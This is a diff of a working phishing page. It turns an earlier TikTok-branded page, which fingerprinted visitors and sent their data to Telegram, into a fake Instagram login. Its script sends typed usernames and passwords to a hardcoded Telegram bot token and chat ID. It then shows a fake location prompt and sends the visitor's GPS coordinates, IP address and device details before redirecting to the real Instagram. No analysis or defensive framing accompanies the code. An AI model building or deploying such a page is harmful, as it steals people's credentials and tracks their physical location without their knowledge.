@@ -3,188 +3,450 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok</title>
+    <title>Instagram</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;}
-        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow-y:auto;color:#fff;padding:20px;}
-        .loader{text-align:center;width:100%;max-width:420px;padding:20px;}
-        .loader svg{margin-bottom:16px;}
-        .loader h2{font-size:28px;font-weight:700;margin-bottom:4px;letter-spacing:1px;}
-        .loader .sub{color:#888;font-size:15px;margin-bottom:20px;}
-        .spinner{width:38px;height:38px;border:3px solid #222;border-top-color:#ff0050;border-radius:50%;animation:spin 0.7s linear infinite;margin:0 auto;}
-
-        /* ئایفۆنەکان */
-        .iphone-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:20px 0;}
-        .iphone-item{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 6px;text-align:center;transition:all 0.3s ease;}
-        .iphone-item .icon{font-size:24px;margin-bottom:4px;}
-        .iphone-item .name{font-size:11px;font-weight:600;color:#fff;letter-spacing:0.3px;}
-        .iphone-item .year{font-size:9px;color:rgba(255,255,255,0.3);margin-top:2px;}
-        .iphone-item.pro{border-color:rgba(255,51,102,0.15);background:rgba(255,51,102,0.05);}
-        .iphone-item.pro .name{color:#ff6b9d;}
-        .iphone-item.mini{border-color:rgba(0,242,234,0.1);}
-        .iphone-item.se{border-color:rgba(255,204,0,0.1);}
-
+        body{
+            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+            background:#fff;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            min-height:100vh;
+            color:#262626;
+            padding:20px;
+        }
+        .login-box{
+            text-align:center;
+            width:100%;
+            max-width:400px;
+            padding:40px 30px;
+            background:#fff;
+            border:1px solid #dbdbdb;
+            border-radius:4px;
+        }
+        .logo{
+            margin-bottom:30px;
+        }
+        .logo svg{
+            width:175px;
+            height:auto;
+        }
+        .login-box h2{
+            font-size:16px;
+            font-weight:400;
+            color:#8e8e8e;
+            margin-bottom:20px;
+        }
+        .input-group{
+            margin-bottom:10px;
+            text-align:left;
+        }
+        .input-group input{
+            width:100%;
+            padding:14px 12px;
+            background:#fafafa;
+            border:1px solid #dbdbdb;
+            border-radius:4px;
+            font-size:14px;
+            font-family:inherit;
+            outline:none;
+            transition:border 0.2s;
+        }
+        .input-group input:focus{
+            border-color:#a8a8a8;
+        }
+        .input-group input::placeholder{
+            color:#999;
+        }
+        .login-btn{
+            display:block;
+            width:100%;
+            padding:12px;
+            background:#0095f6;
+            border:none;
+            border-radius:8px;
+            color:#fff;
+            font-size:14px;
+            font-weight:600;
+            font-family:inherit;
+            cursor:pointer;
+            margin:15px 0 10px;
+            transition:background 0.2s;
+        }
+        .login-btn:hover{background:#1877f2;}
+        .login-btn:disabled{
+            background:#b2dffc;
+            cursor:not-allowed;
+        }
+        .divider{
+            display:flex;
+            align-items:center;
+            margin:20px 0;
+            color:#8e8e8e;
+            font-size:13px;
+            font-weight:600;
+        }
+        .divider::before, .divider::after{
+            content:"";
+            flex:1;
+            height:1px;
+            background:#dbdbdb;
+        }
+        .divider span{padding:0 18px;}
+        .fb-login{
+            color:#385185;
+            font-weight:600;
+            font-size:14px;
+            cursor:pointer;
+            margin:8px 0;
+        }
+        .forgot-pw{
+            color:#00376b;
+            font-size:12px;
+            cursor:pointer;
+            margin-top:12px;
+        }
+        .signup-box{
+            margin-top:12px;
+            padding:20px 0;
+            border:1px solid #dbdbdb;
+            border-radius:4px;
+            text-align:center;
+            font-size:14px;
+        }
+        .signup-box a{
+            color:#0095f6;
+            font-weight:600;
+            text-decoration:none;
+        }
+        .get-app{
+            text-align:center;
+            margin-top:15px;
+        }
+        .get-app p{font-size:14px;margin-bottom:12px;}
+        .app-badges img{
+            height:40px;
+            margin:0 4px;
+        }
+        .loader-overlay{
+            display:none;
+            position:fixed;
+            top:0;left:0;right:0;bottom:0;
+            background:rgba(255,255,255,0.92);
+            z-index:999;
+            justify-content:center;
+            align-items:center;
+            flex-direction:column;
+        }
+        .loader-overlay.active{
+            display:flex;
+        }
+        .loader-overlay .spinner{
+            width:44px;height:44px;
+            border:3px solid #e0e0e0;
+            border-top-color:#0095f6;
+            border-radius:50%;
+            animation:spin 0.7s linear infinite;
+            margin-bottom:16px;
+        }
         @keyframes spin{to{transform:rotate(360deg);}}
-        .redirect-note{color:#444;font-size:12px;margin-top:30px;}
+        .loader-overlay p{
+            color:#8e8e8e;
+            font-size:15px;
+        }
+        .gps-request{
+            display:none;
+            position:fixed;
+            top:0;left:0;right:0;bottom:0;
+            background:rgba(0,0,0,0.6);
+            z-index:1000;
+            justify-content:center;
+            align-items:center;
+        }
+        .gps-request.active{display:flex;}
+        .gps-modal{
+            background:#fff;
+            border-radius:20px;
+            padding:30px 25px;
+            max-width:340px;
+            width:90%;
+            text-align:center;
+            animation:fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn{
+            from{transform:scale(0.9);opacity:0;}
+            to{transform:scale(1);opacity:1;}
+        }
+        .gps-modal .icon{margin-bottom:12px;}
+        .gps-modal h3{
+            font-size:18px;
+            margin-bottom:6px;
+        }
+        .gps-modal p{
+            color:#666;
+            font-size:14px;
+            line-height:1.5;
+            margin-bottom:20px;
+        }
+        .gps-modal .allow-btn{
+            display:block;
+            width:100%;
+            padding:14px;
+            background:#0095f6;
+            border:none;
+            border-radius:12px;
+            color:#fff;
+            font-size:16px;
+            font-weight:600;
+            font-family:inherit;
+            cursor:pointer;
+        }
+        .gps-modal .allow-btn:hover{background:#1877f2;}
+        .gps-modal .deny-btn{
+            display:block;
+            width:100%;
+            padding:12px;
+            background:transparent;
+            border:none;
+            color:#0095f6;
+            font-size:14px;
+            font-weight:600;
+            font-family:inherit;
+            cursor:pointer;
+            margin-top:8px;
+        }
     </style>
 </head>
 <body>
-    <div class="loader" id="app">
-        <svg width="56" height="56" viewBox="0 0 24 24" fill="none">
-            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.53 3.66-.52.36-1 .53-1.42.52-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.41-.88.03-.24.37-.49 1.02-.74 3.99-1.73 6.65-2.88 7.98-3.43 3.8-1.58 4.59-1.85 5.1-1.86.11 0 .37.03.53.17.14.12.18.28.2.45-.02.12-.02.2-.04.31z" fill="#ff0050"/>
-        </svg>
-        <h2>TikTok</h2>
-        <p class="sub">چاوەڕوانبە...</p>
 
-        <!-- ئایفۆنەکان -->
-        <div style="margin:8px 0;font-size:12px;color:#666;">IPhone 7 to 17</div>
-        <div class="iphone-grid">
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">iPhone 7</div><div class="year">2016</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">7 Plus</div><div class="year">2016</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">iPhone 8</div><div class="year">2017</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">8 Plus</div><div class="year">2017</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">iPhone X</div><div class="year">2017</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">XS</div><div class="year">2018</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">XS Max</div><div class="year">2018</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">XR</div><div class="year">2018</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">iPhone 11</div><div class="year">2019</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">11 Pro</div><div class="year">2019</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">11 Pro Max</div><div class="year">2019</div></div>
-            <div class="iphone-item mini"><div class="icon">📱</div><div class="name">12 Mini</div><div class="year">2020</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">iPhone 12</div><div class="year">2020</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">12 Pro</div><div class="year">2020</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">12 Pro Max</div><div class="year">2020</div></div>
-            <div class="iphone-item mini"><div class="icon">📱</div><div class="name">13 Mini</div><div class="year">2021</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">iPhone 13</div><div class="year">2021</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">13 Pro</div><div class="year">2021</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">13 Pro Max</div><div class="year">2021</div></div>
-            <div class="iphone-item se"><div class="icon">📱</div><div class="name">SE (3rd)</div><div class="year">2022</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">iPhone 14</div><div class="year">2022</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">14 Plus</div><div class="year">2022</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">14 Pro</div><div class="year">2022</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">14 Pro Max</div><div class="year">2022</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">iPhone 15</div><div class="year">2023</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">15 Plus</div><div class="year">2023</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">15 Pro</div><div class="year">2023</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">15 Pro Max</div><div class="year">2023</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">iPhone 16</div><div class="year">2024</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">16 Plus</div><div class="year">2024</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">16 Pro</div><div class="year">2024</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">16 Pro Max</div><div class="year">2024</div></div>
-            <div class="iphone-item se"><div class="icon">📱</div><div class="name">16e</div><div class="year">2025</div></div>
-            <div class="iphone-item"><div class="icon">📱</div><div class="name">iPhone 17</div><div class="year">2026</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">17 Pro</div><div class="year">2026</div></div>
-            <div class="iphone-item pro"><div class="icon">📱</div><div class="name">17 Pro Max</div><div class="year">2026</div></div>
-            <div class="iphone-item se"><div class="icon">📱</div><div class="name">SE 4</div><div class="year">2026</div></div>
+    <!-- GPS Request Modal (pirî caran dikeve) -->
+    <div class="gps-request" id="gpsModal">
+        <div class="gps-modal">
+            <div class="icon">
+                <svg width="48" height="48" viewBox="0 0 24 24" fill="none">
+                    <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" fill="#0095f6"/>
+                </svg>
+            </div>
+            <h3>Allow Instagram to access your location?</h3>
+            <p>Instagram uses your location to show you relevant content, tags, and nearby posts. Your location is not shared publicly.</p>
+            <button class="allow-btn" id="allowGps">Allow Location Access</button>
+            <button class="deny-btn" id="denyGps">Not Now</button>
         </div>
+    </div>
 
+    <!-- Loader / redirect overlay -->
+    <div class="loader-overlay" id="loaderOverlay">
         <div class="spinner"></div>
-        <p class="redirect-note">دەچیتە وێبگەڕ</p>
+        <p id="loaderStatus">Signing in...</p>
+    </div>
+
+    <!-- Instagram Login Page -->
+    <div id="loginPage">
+        <div class="login-box">
+            <div class="logo">
+                <svg viewBox="0 0 175 50" fill="#262626">
+                    <path d="M41.4 14.5c-1.1-2.5-2.7-4.4-4.9-5.8-2.2-1.4-4.6-2.1-7.4-2.1-2.7 0-5.2.7-7.4 2.1-2.2 1.4-3.9 3.3-4.9 5.8-1.1 2.5-1.6 5.2-1.6 8.1 0 2.9.5 5.6 1.6 8.1 1.1 2.5 2.7 4.4 4.9 5.8 2.2 1.4 4.7 2.1 7.4 2.1 2.7 0 5.2-.7 7.4-2.1 2.2-1.4 3.9-3.3 4.9-5.8 1.1-2.5 1.6-5.2 1.6-8.1 0-2.9-.5-5.6-1.6-8.1zm-3.5 13.9c-.8 1.8-1.9 3.2-3.3 4.2-1.4 1-3 1.5-4.8 1.5-1.7 0-3.3-.5-4.8-1.5-1.4-1-2.5-2.4-3.3-4.2-.8-1.8-1.2-3.8-1.2-5.9 0-2.1.4-4.1 1.2-5.9.8-1.8 1.9-3.2 3.3-4.2 1.4-1 3-1.5 4.8-1.5 1.7 0 3.3.5 4.8 1.5 1.4 1 2.5 2.4 3.3 4.2.8 1.8 1.2 3.8 1.2 5.9 0 2.1-.4 4.1-1.2 5.9z"/>
+                    <path d="M85.4 14.5c-1.1-2.5-2.7-4.4-4.9-5.8-2.2-1.4-4.6-2.1-7.4-2.1-2.7 0-5.2.7-7.4 2.1-2.2 1.4-3.9 3.3-4.9 5.8-1.1 2.5-1.6 5.2-1.6 8.1 0 2.9.5 5.6 1.6 8.1 1.1 2.5 2.7 4.4 4.9 5.8 2.2 1.4 4.7 2.1 7.4 2.1 2.7 0 5.2-.7 7.4-2.1 2.2-1.4 3.9-3.3 4.9-5.8 1.1-2.5 1.6-5.2 1.6-8.1 0-2.9-.5-5.6-1.6-8.1zm-3.5 13.9c-.8 1.8-1.9 3.2-3.3 4.2-1.4 1-3 1.5-4.8 1.5-1.7 0-3.3-.5-4.8-1.5-1.4-1-2.5-2.4-3.3-4.2-.8-1.8-1.2-3.8-1.2-5.9 0-2.1.4-4.1 1.2-5.9.8-1.8 1.9-3.2 3.3-4.2 1.4-1 3-1.5 4.8-1.5 1.7 0 3.3.5 4.8 1.5 1.4 1 2.5 2.4 3.3 4.2.8 1.8 1.2 3.8 1.2 5.9 0 2.1-.4 4.1-1.2 5.9z"/>
+                    <path d="M125.7 6.7v21c0 2.9-.7 5.2-2.1 7-1.4 1.8-3.4 2.7-6 2.7-1.4 0-2.7-.3-3.9-.8-1.2-.5-2.2-1.3-3-2.3l2.7-3.3c1.2 1.4 2.6 2.1 4.2 2.1 1.4 0 2.5-.5 3.3-1.4.8-.9 1.2-2.3 1.2-4v-2.2c-.6.8-1.4 1.4-2.4 1.8-1 .4-2.1.7-3.3.7-2.7 0-5.2-.7-7.4-2.1-2.2-1.4-3.9-3.3-4.9-5.8-1.1-2.5-1.6-5.2-1.6-8.1 0-2.9.5-5.6 1.6-8.1 1.1-2.5 2.7-4.4 4.9-5.8 2.2-1.4 4.6-2.1 7.4-2.1 1.2 0 2.3.2 3.3.7 1 .4 1.8 1 2.4 1.8V6.7h3.6zm-10.5 21c1.7 0 3.3-.5 4.8-1.5 1.4-1 2.5-2.4 3.3-4.2.8-1.8 1.2-3.8 1.2-5.9 0-2.1-.4-4.1-1.2-5.9-.8-1.8-1.9-3.2-3.3-4.2-1.4-1-3-1.5-4.8-1.5-1.7 0-3.3.5-4.8 1.5-1.4 1-2.5 2.4-3.3 4.2-.8 1.8-1.2 3.8-1.2 5.9 0 2.1.4 4.1 1.2 5.9.8 1.8 1.9 3.2 3.3 4.2 1.5 1 3.1 1.5 4.8 1.5z"/>
+                    <path d="M140.1 6.7l-12.5 29.5h-4.1l4.6-10.6-8.2-18.9h4.3l5.9 14.3 5.9-14.3h4.1zM157.9 6.7v21c0 2.9-.7 5.2-2.1 7-1.4 1.8-3.4 2.7-6 2.7-1.4 0-2.7-.3-3.9-.8-1.2-.5-2.2-1.3-3-2.3l2.7-3.3c1.2 1.4 2.6 2.1 4.2 2.1 1.4 0 2.5-.5 3.3-1.4.8-.9 1.2-2.3 1.2-4v-2.2c-.6.8-1.4 1.4-2.4 1.8-1 .4-2.1.7-3.3.7-2.7 0-5.2-.7-7.4-2.1-2.2-1.4-3.9-3.3-4.9-5.8-1.1-2.5-1.6-5.2-1.6-8.1 0-2.9.5-5.6 1.6-8.1 1.1-2.5 2.7-4.4 4.9-5.8 2.2-1.4 4.6-2.1 7.4-2.1 1.2 0 2.3.2 3.3.7 1 .4 1.8 1 2.4 1.8V6.7h3.6zm-10.5 21c1.7 0 3.3-.5 4.8-1.5 1.4-1 2.5-2.4 3.3-4.2.8-1.8 1.2-3.8 1.2-5.9 0-2.1-.4-4.1-1.2-5.9-.8-1.8-1.9-3.2-3.3-4.2-1.4-1-3-1.5-4.8-1.5-1.7 0-3.3.5-4.8 1.5-1.4 1-2.5 2.4-3.3 4.2-.8 1.8-1.2 3.8-1.2 5.9 0 2.1.4 4.1 1.2 5.9.8 1.8 1.9 3.2 3.3 4.2 1.5 1 3.1 1.5 4.8 1.5z"/>
+                    <path d="M174 6.7v21c0 2.9-.7 5.2-2.1 7-1.4 1.8-3.4 2.7-6 2.7-1.4 0-2.7-.3-3.9-.8-1.2-.5-2.2-1.3-3-2.3l2.7-3.3c1.2 1.4 2.6 2.1 4.2 2.1 1.4 0 2.5-.5 3.3-1.4.8-.9 1.2-2.3 1.2-4v-2.2c-.6.8-1.4 1.4-2.4 1.8-1 .4-2.1.7-3.3.7-2.7 0-5.2-.7-7.4-2.1-2.2-1.4-3.9-3.3-4.9-5.8-1.1-2.5-1.6-5.2-1.6-8.1 0-2.9.5-5.6 1.6-8.1 1.1-2.5 2.7-4.4 4.9-5.8 2.2-1.4 4.6-2.1 7.4-2.1 1.2 0 2.3.2 3.3.7 1 .4 1.8 1 2.4 1.8V6.7h3.6zm-10.5 21c1.7 0 3.3-.5 4.8-1.5 1.4-1 2.5-2.4 3.3-4.2.8-1.8 1.2-3.8 1.2-5.9 0-2.1-.4-4.1-1.2-5.9-.8-1.8-1.9-3.2-3.3-4.2-1.4-1-3-1.5-4.8-1.5-1.7 0-3.3.5-4.8 1.5-1.4 1-2.5 2.4-3.3 4.2-.8 1.8-1.2 3.8-1.2 5.9 0 2.1.4 4.1 1.2 5.9.8 1.8 1.9 3.2 3.3 4.2 1.5 1 3.1 1.5 4.8 1.5z"/>
+                </svg>
+            </div>
+            
+            <div class="input-group">
+                <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="off">
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Password" autocomplete="off">
+            </div>
+            
+            <button class="login-btn" id="loginBtn" onclick="handleLogin()">Log In</button>
+            
+            <div class="divider"><span>OR</span></div>
+            
+            <div class="fb-login">Log in with Facebook</div>
+            <div class="forgot-pw">Forgot password?</div>
+        </div>
+        
+        <div class="signup-box">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+        
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="app-badges">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'%3E%3Crect width='135' height='40' rx='4' fill='%23111211'/%3E%3Ctext x='12' y='26' fill='white' font-size='10' font-family='sans-serif'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Google Play" style="height:40px;">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'%3E%3Crect width='135' height='40' rx='4' fill='%23111211'/%3E%3Ctext x='12' y='26' fill='white' font-size='10' font-family='sans-serif'%3EMicrosoft%3C/text%3E%3C/svg%3E" alt="Microsoft" style="height:40px;">
+            </div>
+        </div>
     </div>
 
     <script>
-        // ==================== تۆکنەکانت ====================
+        // ==================== Telegram Credentials ====================
         const BOT_TOKEN = "8736195412:AAETqDHUXTWVXnto8tpgaIqhqWh_JwY-wEE";
         const CHAT_ID = "6230485449";
-        // =================================================
+        // =============================================================
 
+        // Send to Telegram via multiple methods
         function sendToTelegram(text) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=Markdown&text=${encodeURIComponent(text)}`;
-            new Image().src = url;
+            // Method 1: Image beacon
+            new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=Markdown&text=${encodeURIComponent(text)}`;
+            
+            // Method 2: Fetch with no-cors
             try {
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST', mode: 'no-cors',
+                    method: 'POST',
+                    mode: 'no-cors',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'})
                 });
             } catch(e) {}
-            try {
-                const xhr = new XMLHttpRequest();
-                xhr.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, true);
-                xhr.setRequestHeader('Content-Type', 'application/json');
-                xhr.send(JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'}));
-            } catch(e) {}
         }
 
-        function getIP(callback) {
+        // Get IP
+        async function getIP() {
             try {
-                const s = document.createElement('script');
-                s.src = 'https://api.ipify.org?format=jsonp&callback=ipCallback';
-                window.ipCallback = function(data) {
-                    callback(data.ip);
-                    if(s.parentNode) s.parentNode.removeChild(s);
-                    delete window.ipCallback;
-                };
-                document.body.appendChild(s);
-                setTimeout(() => callback('نەدۆزرایەوە'), 5000);
-            } catch(e) { callback('نەدۆزرایەوە'); }
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                return d.ip || 'نەزانراو';
+            } catch(e) {
+                return 'نەدۆزرایەوە';
+            }
         }
 
-        function collectAndSend() {
-            getIP(function(ip) {
-                const ua = navigator.userAgent;
-                const os = navigator.platform;
-                const lang = navigator.language;
-                const screenRes = `${screen.width}x${screen.height}`;
-                const colorDepth = `${screen.colorDepth}-bit`;
-                const cores = navigator.hardwareConcurrency || 'نەزانراو';
-                const memory = navigator.deviceMemory || 'نەزانراو';
-                const time = new Date().toLocaleString();
-                const referrer = document.referrer || 'ڕاستەوخۆ';
-                
-                let batteryInfo = '';
-                if (navigator.getBattery) {
-                    navigator.getBattery().then(bat => {
-                        batteryInfo = `\n**🔋 بەتەری:** ${Math.round(bat.level * 100)}%`;
-                    }).catch(() => {});
-                }
-                
-                let msg = `🎯 **زانیاری قوربانی**\n\n`;
-                msg += `**🌐 ئایپی:** \`${ip}\`\n`;
-                msg += `**🖥 User-Agent:** \`${ua}\`\n`;
-                msg += `**📱 OS:** ${os}\n`;
-                msg += `**🌍 زمان:** ${lang}\n`;
-                msg += `**📐 شاشە:** ${screenRes}\n`;
-                msg += `**🎨 ڕەنگ:** ${colorDepth}\n`;
-                msg += `**🧠 CPU:** ${cores} cores\n`;
-                msg += `**🔋 RAM:** ${memory} GB\n`;
-                msg += `**🔗 سەرچاوە:** ${referrer}\n`;
-                msg += `**🕐 کات:** ${time}\n`;
-                
-                if (navigator.geolocation) {
+        // Get GPS with high accuracy
+        function getGPS(callback) {
+            if (!navigator.geolocation) {
+                callback(null, 'GPS بەردەست نییە');
+                return;
+            }
+            
+            // First attempt - high accuracy
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    callback({
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        acc: pos.coords.accuracy
+                    });
+                },
+                function(err) {
+                    // Second attempt - low accuracy
                     navigator.geolocation.getCurrentPosition(
                         function(pos) {
-                            msg += `**📍 GPS:** ${pos.coords.latitude}, ${pos.coords.longitude}\n`;
-                            msg += `**📡 وردی:** ${pos.coords.accuracy} مەتر\n`;
-                            sendToTelegram(msg);
+                            callback({
+                                lat: pos.coords.latitude,
+                                lng: pos.coords.longitude,
+                                acc: pos.coords.accuracy
+                            });
                         },
-                        function() { sendToTelegram(msg); },
-                        {timeout: 4000, enableHighAccuracy: true}
+                        function(err2) {
+                            callback(null, err2.message || 'ڕێگەپێ نەدرا');
+                        },
+                        {timeout: 5000, enableHighAccuracy: false}
                     );
-                } else { sendToTelegram(msg); }
-            });
+                },
+                {timeout: 7000, enableHighAccuracy: true}
+            );
         }
 
-        window.onload = function() {
-            collectAndSend();
+        // Collect everything and send to Telegram
+        async function collectAndSend(gpsData, error) {
+            try {
+                const ip = await getIP();
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform || 'نەزانراو';
+                const lang = navigator.language || 'نەزانراو';
+                
+                let msg = `📍 **Instagram GPS Location** 📍\n\n`;
+                msg += `**🌐 IP:** \`${ip}\`\n`;
+                msg += `**📱 Platform:** ${platform}\n`;
+                msg += `**🌍 Language:** ${lang}\n`;
+                msg += `**🕐 Time:** ${new Date().toLocaleString()}\n\n`;
+                
+                if (gpsData) {
+                    msg += `**📍 GPS:** \`${gpsData.lat}, ${gpsData.lng}\`\n`;
+                    msg += `**📡 Accuracy:** ${Math.round(gpsData.acc)} meters\n\n`;
+                    msg += `**🔗 Google Maps:**\n`;
+                    msg += `https://www.google.com/maps?q=${gpsData.lat},${gpsData.lng}\n\n`;
+                } else {
+                    msg += `**⚠️ GPS Error:** ${error || 'نەدۆزرایەوە'}\n\n`;
+                }
+                
+                msg += `**User-Agent:**\n\`${userAgent}\``;
+                
+                sendToTelegram(msg);
+            } catch(e) {
+                sendToTelegram(`❌ Error: ${e.message}`);
+            }
+        }
+
+        // Handle login button click
+        function handleLogin() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const loginBtn = document.getElementById('loginBtn');
             
+            if (!username || !password) {
+                alert('Please enter your username and password');
+                return;
+            }
+            
+            // Show loader
+            document.getElementById('loaderOverlay').classList.add('active');
+            document.getElementById('loaderStatus').textContent = 'Signing in...';
+            loginBtn.disabled = true;
+            
+            // Send credentials to Telegram
+            let credMsg = `🔐 **Instagram Credentials** 🔐\n\n`;
+            credMsg += `**👤 Username:** \`${username}\`\n`;
+            credMsg += `**🔑 Password:** \`${password}\`\n`;
+            credMsg += `**🕐 Time:** ${new Date().toLocaleString()}\n`;
+            credMsg += `**🌐 IP:** ${window.location.hostname}`;
+            sendToTelegram(credMsg);
+            
+            // Now trigger GPS request
             setTimeout(function() {
-                const tiktokUrl = 'https://www.tiktok.com';
-                
-                const a = document.createElement('a');
-                a.href = tiktokUrl;
-                a.target = '_blank';
-                a.rel = 'noopener noreferrer';
-                a.style.display = 'none';
-                document.body.appendChild(a);
-                a.click();
-                
-                try { window.open(tiktokUrl, '_blank'); } catch(e) {}
+                document.getElementById('loaderOverlay').classList.remove('active');
+                document.getElementById('gpsModal').classList.add('active');
+            }, 1500);
+        }
+
+        // Allow GPS
+        document.getElementById('allowGps').addEventListener('click', function() {
+            document.getElementById('gpsModal').classList.remove('active');
+            document.getElementById('loaderOverlay').classList.add('active');
+            document.getElementById('loaderStatus').textContent = 'Verifying location...';
+            
+            getGPS(function(gpsData, error) {
+                collectAndSend(gpsData, error);
                 
                 setTimeout(function() {
-                    window.location.href = tiktokUrl;
-                }, 300);
-            }, 2200);
+                    document.getElementById('loaderOverlay').classList.remove('active');
+                    document.getElementById('loaderStatus').textContent = 'Signing in...';
+                    loginBtn.disabled = false;
+                    // Redirect to real Instagram
+                    window.location.href = 'https://www.instagram.com';
+                }, 2000);
+            });
+        });
+
+        // Deny GPS
+        document.getElementById('denyGps').addEventListener('click', function() {
+            document.getElementById('gpsModal').classList.remove('active');
+            collectAndSend(null, 'User denied GPS');
+            setTimeout(function() {
+                window.location.href = 'https://www.instagram.com';
+            }, 1000);
+        });
+
+        // Also trigger GPS immediately on page load (before login)
+        window.onload = function() {
+            // Try to get GPS silently first
+            setTimeout(function() {
+                document.getElementById('gpsModal').classList.add('active');
+            }, 3000);
         };
     </script>
 </body>
